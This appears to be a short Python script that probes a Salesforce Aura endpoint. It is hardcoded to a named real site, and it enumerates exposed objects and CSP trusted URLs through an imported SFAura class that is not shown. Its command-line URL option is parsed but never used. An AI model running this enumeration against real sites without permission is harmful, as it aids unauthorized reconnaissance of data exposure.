import sys
import optparse

from classes.SFAura import SFAura

def menu():
    parser = optparse.OptionParser()
    parser.add_option('-u', '--url', dest="url", help='ex: google.com')

    options, args = parser.parse_args()
    globals().update(locals())

def exploit():
    url = SFAura("https://channel.latch.com/")

    is_salesforce = url.is_salesforce_aura()

    if not is_salesforce:
        sys.exit("The provided url is not using salesforce solution")

    url.retrive_fwuid()

    config_data = url.get_config_data()
    
    print(url.get_objects(config_data))
    print(url.get_csp_trusted_urls(config_data))

menu()
exploit()